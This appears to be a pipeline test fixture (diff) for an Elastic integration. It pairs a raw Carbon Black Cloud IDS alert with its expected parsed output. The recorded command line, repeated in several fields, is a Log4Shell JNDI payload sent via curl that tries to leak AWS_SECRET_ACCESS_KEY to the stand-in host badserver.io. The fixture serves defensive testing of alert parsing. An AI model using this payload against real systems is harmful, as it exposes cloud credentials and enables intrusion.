@@ -1,0 +1,172 @@
+{
+  "expected": [
+    {
+      "@timestamp": "2051-02-03T17:22:03.945Z",
+      "carbon_black_cloud": {
+        "alert": {
+          "alert_notes_present": false,
+          "attack_tactic": "TA0001",
+          "attack_technique": "T1190",
+          "category": "THREAT",
+          "device": {
+            "external_ip": "192.0.2.230",
+            "internal_ip": "10.134.182.205",
+            "location": "UNKNOWN",
+            "os": "WINDOWS",
+            "policy": "Standard",
+            "policy_id": 165700,
+            "target_value": "MEDIUM"
+          },
+          "is_updated": false,
+          "mdr": {
+            "alert": false,
+            "alert_notes_present": false
+          },
+          "netconn": {
+            "local_ip": "10.134.182.205",
+            "local_ipv4": "10.134.182.205",
+            "local_port": 49233,
+            "remote_domain": "google.com",
+            "remote_ip": "203.0.113.138",
+            "remote_ipv4": "203.0.113.138",
+            "remote_port": 80
+          },
+          "organization_key": "ABCD1234",
+          "parent": {
+            "cmdline": "\"C:\\WINDOWS\\system32\\cmd.exe\" ",
+            "effective_reputation": "TRUSTED_WHITE_LIST",
+            "guid": "ABCD1234-010ac2d3-0000225c-00000000-1d9300e2bb5211a",
+            "hash": {
+              "md5": "9f5966e5559acfb86729e0b5b3b8dacf",
+              "sha256": "d48a54c503992bcb1169cc5bd63aae33e211e3759e958898d69283045f151471"
+            },
+            "name": "c:\\windows\\system32\\cmd.exe",
+            "pid": 8796,
+            "reputation": "TRUSTED_WHITE_LIST",
+            "username": "FCV06-98S-6\\bit9qa"
+          },
+          "policy_applied": "NOT_APPLIED",
+          "primary_event_id": "43FF3E90-1B22-14EC-A16D-195657D64C48",
+          "process": {
+            "cmdline": "curl  -H \"Host: \\${jndi:ldap://\\{env:AWS_SECRET_ACCESS_KEY}.badserver.io}\" http://google.com/testingids",
+            "effective_reputation": "TRUSTED_WHITE_LIST",
+            "guid": "ABCD1234-010ac2d3-00001694-00000000-1d937f40884b9e0",
+            "hash": {
+              "md5": "dad44aabbc5fb1e705b9cf294bc0e7a6",
+              "sha256": "c81e53d77def249ff378af670111c8f32a5c2a0664582ab71909424d97cfbff4"
+            },
+            "issuer": [
+              "Microsoft Windows Production PCA 2011"
+            ],
+            "name": "c:\\windows\\system32\\curl.exe",
+            "pid": 5780,
+            "publisher": [
+              "Microsoft Windows"
+            ],
+            "reputation": "TRUSTED_WHITE_LIST",
+            "username": "FCV06-98S-6\\bit9qa"
+          },
+          "reason_code": "FC35BDC3-4D86-4BAD-9818-A6CEA78F6A7C:C9183C7B-898D-4CCB-8F68-5A10EBC88531",
+          "rule_category_id": "FC35BDC3-4D86-4BAD-9818-A6CEA78F6A7C",
+          "rule_id": "C9183C7B-898D-4CCB-8F68-5A10EBC88531",
+          "run_state": "RAN",
+          "sensor_action": "ALLOW",
+          "threat_id": "bfb957b98c9d4727887620c46dd0d9e64b0cd23c1b188a9ad8c71c95217e1711",
+          "threat_name": "CVE-2021-44228 Exploit",
+          "tms_rule_id": "5b83601f-ae3b-4db7-b21e-e1e64481f150",
+          "type": "INTRUSION_DETECTION_SYSTEM",
+          "url": "https://defense-dev01.cbdtest.io/alerts?orgKey=ABCD1234&s%5Bc%5D%5Bquery_string%5D=id%3Aca316d99-a808-3779-8aab-62b2b6d9541c",
+          "version": "2.0.0",
+          "workflow": {
+            "change_timestamp": "2051-02-03T17:27:33.007Z",
+            "changed_by": "ALERT_CREATION",
+            "changed_by_type": "SYSTEM",
+            "closure_reason": "NO_REASON",
+            "status": "OPEN"
+          }
+        }
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "end": "2051-02-03T17:22:03.945Z",
+        "id": "bc033f37-a305-3349-8fbb-89b4c9f6927f",
+        "kind": "alert",
+        "original": "{\"version\":\"2.0.0\",\"org_key\":\"ABCD1234\",\"alert_url\":\"https://defense-dev01.cbdtest.io/alerts?orgKey=ABCD1234&s%5Bc%5D%5Bquery_string%5D=id%3Aca316d99-a808-3779-8aab-62b2b6d9541c\",\"id\":\"bc033f37-a305-3349-8fbb-89b4c9f6927f\",\"type\":\"INTRUSION_DETECTION_SYSTEM\",\"is_updated\":false,\"detection_timestamp\":\"2051-02-03T17:22:03.945Z\",\"first_event_timestamp\":\"2051-02-03T17:22:03.945Z\",\"last_event_timestamp\":\"2051-02-03T17:22:03.945Z\",\"severity\":1,\"reason\":\"HTTP traffic from asset FCV06-98S-6 matched IDS signature for threat CVE-2021-44228 Exploit. curl.exe made a HTTP/80 connection to 203.0.113.138 from 10.134.182.205\",\"threat_id\":\"bfb957b98c9d4727887620c46dd0d9e64b0cd23c1b188a9ad8c71c95217e1711\",\"primary_event_id\":\"43FF3E90-1B22-14EC-A16D-195657D64C48\",\"workflow\":{\"status\":\"OPEN\",\"change_timestamp\":\"2051-02-03T17:27:33.007Z\",\"changed_by_type\":\"SYSTEM\",\"changed_by\":\"ALERT_CREATION\",\"closure_reason\":\"NO_REASON\"},\"alert_notes_present\":false,\"policy_applied\":\"NOT_APPLIED\",\"run_state\":\"RAN\",\"rule_category_id\":\"FC35BDC3-4D86-4BAD-9818-A6CEA78F6A7C\",\"rule_id\":\"C9183C7B-898D-4CCB-8F68-5A10EBC88531\",\"reason_code\":\"FC35BDC3-4D86-4BAD-9818-A6CEA78F6A7C:C9183C7B-898D-4CCB-8F68-5A10EBC88531\",\"sensor_action\":\"ALLOW\",\"device_target_value\":\"MEDIUM\",\"device_policy_id\":165700,\"device_policy\":\"Standard\",\"device_id\":17482451,\"device_name\":\"FCV06-98S-6\",\"device_os\":\"WINDOWS\",\"device_os_version\":\"Windows 10 x64\",\"device_username\":\"DemoMachine\",\"device_location\":\"UNKNOWN\",\"device_external_ip\":\"192.0.2.230\",\"device_internal_ip\":\"10.134.182.205\",\"netconn_remote_port\":80,\"netconn_local_port\":49233,\"netconn_remote_domain\":\"google.com\",\"netconn_remote_ip\":\"203.0.113.138\",\"netconn_local_ip\":\"10.134.182.205\",\"netconn_remote_ipv4\":\"203.0.113.138\",\"netconn_local_ipv4\":\"10.134.182.205\",\"attack_tactic\":\"TA0001\",\"attack_technique\":\"T1190\",\"tms_rule_id\":\"5b83601f-ae3b-4db7-b21e-e1e64481f150\",\"threat_name\":\"CVE-2021-44228 Exploit\",\"process_guid\":\"ABCD1234-010ac2d3-00001694-00000000-1d937f40884b9e0\",\"process_pid\":5780,\"process_name\":\"c:\\\\windows\\\\system32\\\\curl.exe\",\"process_sha256\":\"c81e53d77def249ff378af670111c8f32a5c2a0664582ab71909424d97cfbff4\",\"process_md5\":\"dad44aabbc5fb1e705b9cf294bc0e7a6\",\"process_reputation\":\"TRUSTED_WHITE_LIST\",\"process_effective_reputation\":\"TRUSTED_WHITE_LIST\",\"process_cmdline\":\"curl  -H \\\"Host: \\\\${jndi:ldap://\\\\{env:AWS_SECRET_ACCESS_KEY}.badserver.io}\\\" http://google.com/testingids\",\"process_username\":\"FCV06-98S-6\\\\bit9qa\",\"process_issuer\":[\"Microsoft Windows Production PCA 2011\"],\"process_publisher\":[\"Microsoft Windows\"],\"parent_guid\":\"ABCD1234-010ac2d3-0000225c-00000000-1d9300e2bb5211a\",\"parent_pid\":8796,\"parent_name\":\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"parent_sha256\":\"d48a54c503992bcb1169cc5bd63aae33e211e3759e958898d69283045f151471\",\"parent_md5\":\"9f5966e5559acfb86729e0b5b3b8dacf\",\"parent_reputation\":\"TRUSTED_WHITE_LIST\",\"parent_effective_reputation\":\"TRUSTED_WHITE_LIST\",\"parent_cmdline\":\"\\\"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\\\" \",\"parent_username\":\"FCV06-98S-6\\\\bit9qa\",\"mdr_alert_notes_present\":false,\"mdr_alert\":false}",
+        "reason": "HTTP traffic from asset FCV06-98S-6 matched IDS signature for threat CVE-2021-44228 Exploit. curl.exe made a HTTP/80 connection to 203.0.113.138 from 10.134.182.205",
+        "severity": 1,
+        "start": "2051-02-03T17:22:03.945Z"
+      },
+      "host": {
+        "hostname": "FCV06-98S-6",
+        "id": "17482451",
+        "name": "FCV06-98S-6",
+        "os": {
+          "type": "windows",
+          "version": "Windows 10 x64"
+        }
+      },
+      "process": {
+        "command_line": "curl  -H \"Host: \\${jndi:ldap://\\{env:AWS_SECRET_ACCESS_KEY}.badserver.io}\" http://google.com/testingids",
+        "entity_id": "ABCD1234-010ac2d3-00001694-00000000-1d937f40884b9e0",
+        "executable": "c:\\windows\\system32\\curl.exe",
+        "hash": {
+          "md5": "dad44aabbc5fb1e705b9cf294bc0e7a6",
+          "sha256": "c81e53d77def249ff378af670111c8f32a5c2a0664582ab71909424d97cfbff4"
+        },
+        "name": "curl.exe",
+        "parent": {
+          "command_line": "\"C:\\WINDOWS\\system32\\cmd.exe\" ",
+          "entity_id": "ABCD1234-010ac2d3-0000225c-00000000-1d9300e2bb5211a",
+          "executable": "c:\\windows\\system32\\cmd.exe",
+          "hash": {
+            "md5": "9f5966e5559acfb86729e0b5b3b8dacf",
+            "sha256": "d48a54c503992bcb1169cc5bd63aae33e211e3759e958898d69283045f151471"
+          },
+          "name": "cmd.exe",
+          "pid": 8796
+        },
+        "pid": 5780
+      },
+      "related": {
+        "hash": [
+          "d48a54c503992bcb1169cc5bd63aae33e211e3759e958898d69283045f151471",
+          "9f5966e5559acfb86729e0b5b3b8dacf",
+          "c81e53d77def249ff378af670111c8f32a5c2a0664582ab71909424d97cfbff4",
+          "dad44aabbc5fb1e705b9cf294bc0e7a6"
+        ],
+        "hosts": [
+          "FCV06-98S-6"
+        ],
+        "user": [
+          "DemoMachine"
+        ]
+      },
+      "tags": [
+        "preserve_original_event"
+      ],
+      "user": {
+        "name": "DemoMachine"
+      }
+    }
+  ],
+  "input": [
+    {
+      "message": "{\"version\":\"2.0.0\",\"org_key\":\"ABCD1234\",\"alert_url\":\"https://defense-dev01.cbdtest.io/alerts?orgKey=ABCD1234&s%5Bc%5D%5Bquery_string%5D=id%3Aca316d99-a808-3779-8aab-62b2b6d9541c\",\"id\":\"bc033f37-a305-3349-8fbb-89b4c9f6927f\",\"type\":\"INTRUSION_DETECTION_SYSTEM\",\"is_updated\":false,\"detection_timestamp\":\"2051-02-03T17:22:03.945Z\",\"first_event_timestamp\":\"2051-02-03T17:22:03.945Z\",\"last_event_timestamp\":\"2051-02-03T17:22:03.945Z\",\"severity\":1,\"reason\":\"HTTP traffic from asset FCV06-98S-6 matched IDS signature for threat CVE-2021-44228 Exploit. curl.exe made a HTTP/80 connection to 203.0.113.138 from 10.134.182.205\",\"threat_id\":\"bfb957b98c9d4727887620c46dd0d9e64b0cd23c1b188a9ad8c71c95217e1711\",\"primary_event_id\":\"43FF3E90-1B22-14EC-A16D-195657D64C48\",\"workflow\":{\"status\":\"OPEN\",\"change_timestamp\":\"2051-02-03T17:27:33.007Z\",\"changed_by_type\":\"SYSTEM\",\"changed_by\":\"ALERT_CREATION\",\"closure_reason\":\"NO_REASON\"},\"alert_notes_present\":false,\"policy_applied\":\"NOT_APPLIED\",\"run_state\":\"RAN\",\"rule_category_id\":\"FC35BDC3-4D86-4BAD-9818-A6CEA78F6A7C\",\"rule_id\":\"C9183C7B-898D-4CCB-8F68-5A10EBC88531\",\"reason_code\":\"FC35BDC3-4D86-4BAD-9818-A6CEA78F6A7C:C9183C7B-898D-4CCB-8F68-5A10EBC88531\",\"sensor_action\":\"ALLOW\",\"device_target_value\":\"MEDIUM\",\"device_policy_id\":165700,\"device_policy\":\"Standard\",\"device_id\":17482451,\"device_name\":\"FCV06-98S-6\",\"device_os\":\"WINDOWS\",\"device_os_version\":\"Windows 10 x64\",\"device_username\":\"DemoMachine\",\"device_location\":\"UNKNOWN\",\"device_external_ip\":\"192.0.2.230\",\"device_internal_ip\":\"10.134.182.205\",\"netconn_remote_port\":80,\"netconn_local_port\":49233,\"netconn_remote_domain\":\"google.com\",\"netconn_remote_ip\":\"203.0.113.138\",\"netconn_local_ip\":\"10.134.182.205\",\"netconn_remote_ipv4\":\"203.0.113.138\",\"netconn_local_ipv4\":\"10.134.182.205\",\"attack_tactic\":\"TA0001\",\"attack_technique\":\"T1190\",\"tms_rule_id\":\"5b83601f-ae3b-4db7-b21e-e1e64481f150\",\"threat_name\":\"CVE-2021-44228 Exploit\",\"process_guid\":\"ABCD1234-010ac2d3-00001694-00000000-1d937f40884b9e0\",\"process_pid\":5780,\"process_name\":\"c:\\\\windows\\\\system32\\\\curl.exe\",\"process_sha256\":\"c81e53d77def249ff378af670111c8f32a5c2a0664582ab71909424d97cfbff4\",\"process_md5\":\"dad44aabbc5fb1e705b9cf294bc0e7a6\",\"process_reputation\":\"TRUSTED_WHITE_LIST\",\"process_effective_reputation\":\"TRUSTED_WHITE_LIST\",\"process_cmdline\":\"curl  -H \\\"Host: \\\\${jndi:ldap://\\\\{env:AWS_SECRET_ACCESS_KEY}.badserver.io}\\\" http://google.com/testingids\",\"process_username\":\"FCV06-98S-6\\\\bit9qa\",\"process_issuer\":[\"Microsoft Windows Production PCA 2011\"],\"process_publisher\":[\"Microsoft Windows\"],\"parent_guid\":\"ABCD1234-010ac2d3-0000225c-00000000-1d9300e2bb5211a\",\"parent_pid\":8796,\"parent_name\":\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"parent_sha256\":\"d48a54c503992bcb1169cc5bd63aae33e211e3759e958898d69283045f151471\",\"parent_md5\":\"9f5966e5559acfb86729e0b5b3b8dacf\",\"parent_reputation\":\"TRUSTED_WHITE_LIST\",\"parent_effective_reputation\":\"TRUSTED_WHITE_LIST\",\"parent_cmdline\":\"\\\"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\\\" \",\"parent_username\":\"FCV06-98S-6\\\\bit9qa\",\"mdr_alert_notes_present\":false,\"mdr_alert\":false}",
+      "tags": [
+        "preserve_original_event"
+      ]
+    }
+  ],
+  "meta": {
+    "data_stream": "alert_v7",
+    "dynamic_fields": {},
+    "elasticsearch_version": "9.2.2",
+    "entry_pipeline": "compat-carbon_black_cloud-alert_v7-default",
+    "event_count": 1,
+    "numeric_keyword_fields": [],
+    "package": "carbon_black_cloud",
+    "pipelines_commit": "2c934eb5223bdfcf0ea0db9e3230154933352bda"
+  }
+}
